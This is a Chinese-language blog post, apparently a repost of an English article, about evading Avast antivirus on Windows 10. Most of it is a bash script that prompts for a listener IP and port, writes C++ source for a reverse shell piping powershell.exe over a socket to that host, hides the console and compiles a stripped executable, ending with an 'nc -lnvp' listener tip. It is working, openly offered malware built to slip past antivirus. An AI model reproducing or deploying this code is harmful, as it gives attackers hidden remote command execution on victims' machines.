---
title: bypassing-latest-avast-av-on-windows-10-x86_64
date: 2018-09-07 09:43:44
tags: windows
categories: windows
---
![enter description here][1]
<!--more-->
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/bypassing-latest-avast-av-on-windows-10-x86_64.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>








## 文章链接：

https://astr0baby.wordpress.com/2018/09/05/bypassing-latest-avast-av-on-windows-10-x86_64/
对他的思路过程已经在这个博客中做了详细的解释 ，我这里就不多说了
https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/




## 测试效果如下
由于某些原因 ，就不再某安全软件复测了，容易被查杀。

![enter description here][2]
![enter description here][3]



## 文章中的源代码如下：

``` stylus
← Installing Mojave 10.14 Beta in VirtualBox 5.2.16 on Linux x86_64
Bypassing latest Avast AV on Windows 10 x86_64
Posted on September 5, 2018 by astr0baby
Short post here,

Having read a really nice article about avoiding modern AVs (again and again) by @ParanoidNinja here https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/  I have decided to add my 0.1 % of code to his to make it a little easier to use on x86_64 Linux (Mint 19)

You will need to have the mingw64 environment installed properly, I have the following packages installed

ii binutils-mingw-w64-i686 2.30-7ubuntu1+8ubuntu1 amd64 Cross-binutils for Win32 (x86) using MinGW-w64
ii binutils-mingw-w64-x86-64 2.30-7ubuntu1+8ubuntu1 amd64 Cross-binutils for Win64 (x64) using MinGW-w64
ii g++-mingw-w64 7.3.0-11ubuntu1+20.2build1 all GNU C++ compiler for MinGW-w64
ii g++-mingw-w64-i686 7.3.0-11ubuntu1+20.2build1 amd64 GNU C++ compiler for MinGW-w64 targeting Win32
ii g++-mingw-w64-x86-64 7.3.0-11ubuntu1+20.2build1 amd64 GNU C++ compiler for MinGW-w64 targeting Win64
ii gcc-mingw-w64 7.3.0-11ubuntu1+20.2build1 all GNU C compiler for MinGW-w64
ii gcc-mingw-w64-base 7.3.0-11ubuntu1+20.2build1 amd64 GNU Compiler Collection for MinGW-w64 (base package)
ii gcc-mingw-w64-i686 7.3.0-11ubuntu1+20.2build1 amd64 GNU C compiler for MinGW-w64 targeting Win32
ii gcc-mingw-w64-x86-64 7.3.0-11ubuntu1+20.2build1 amd64 GNU C compiler for MinGW-w64 targeting Win64
ii mingw-w64 5.0.3-1 all Development environment targeting 32- and 64-bit Windows
ii mingw-w64-common 5.0.3-1 all Common files for Mingw-w64
ii mingw-w64-i686-dev 5.0.3-1 all Development files for MinGW-w64 targeting Win32
ii mingw-w64-tools 5.0.3-1 amd64 Development tools for 32- and 64-bit Windows
ii mingw-w64-x86-64-dev 5.0.3-1 all Development files for MinGW-w64 targeting Win64
Next we are gonna use the following binary code generator script that will produce our Win32PE executable payload that shall be used on Windows 10 protected by Avast AV

#!/bin/bash
clear
echo "**************************************************************************************"
echo " Automatic C++ source code generator/compiler "
echo " 99.9% code by Paranoid Ninja "
echo " 0.1% code by Astr0 Baby " 
echo " PE32+ executable (GUI) x86-64 "
echo "**************************************************************************************"

echo -en 'Listener server IP : ' 
read ip
echo -en 'Listener port number : ' 
read port

cat <<EOF > final.cpp
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


void RunShell(char* C2Server, int C2Port) {
while(true) {
Sleep(5000); // 1000 = One Second

SOCKET mySocket;
sockaddr_in addr;
WSADATA version;
WSAStartup(MAKEWORD(2,2), &version);
mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
addr.sin_family = AF_INET;

addr.sin_addr.s_addr = inet_addr(C2Server); //IP received from main function
addr.sin_port = htons(C2Port); //Port received from main function

//Connecting to Proxy/ProxyIP/C2Host
if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
closesocket(mySocket);
WSACleanup();
continue;
}
else {
char RecvData[DEFAULT_BUFLEN];
memset(RecvData, 0, sizeof(RecvData));
int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
if (RecvCode <= 0) {
closesocket(mySocket);
WSACleanup();
continue;
}
else {
char Process[] = "powershell.exe";
STARTUPINFO sinfo;
PROCESS_INFORMATION pinfo;
memset(&sinfo, 0, sizeof(sinfo));
sinfo.cb = sizeof(sinfo);
sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
WaitForSingleObject(pinfo.hProcess, INFINITE);
CloseHandle(pinfo.hProcess);
CloseHandle(pinfo.hThread);

memset(RecvData, 0, sizeof(RecvData));
int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
if (RecvCode <= 0) {
closesocket(mySocket);
WSACleanup();
continue;
}
if (strcmp(RecvData, "exit\n") == 0) {
exit(0);
}
}
}
}
}

int main(int argc, char **argv) {
FreeConsole();
if (argc == 3) {
int port = atoi(argv[2]); //Converting port in Char datatype to Integer format
RunShell(argv[1], port);
}
else {
char host[] = "IPGOESHERE";
int port = PORTGOESHERE;
RunShell(host, port);
}
return 0;
}
EOF
sed -i -e "s/IPGOESHERE/$ip/g" final.cpp 
sed -i -e "s/PORTGOESHERE/$port/g" final.cpp

echo "[-] Compiling code .."
x86_64-w64-mingw32-g++ final.cpp -o file.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

if [ $? -eq 0 ]; then
echo "[*] Done ! " 
ls -la file.exe 
else
echo "[-] Failed, please check if you have proper mingw32-g++ installed " 
fi
echo "[-] Now start a local nc listener like this nc -lnvp $port"e
```


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20180907_093244.jpg 
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/2484DD2CEA8C0AA14387588D4EC2E0B4.jpg 
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/878805E990E51FBF6AAC46C3668BF931.jpg 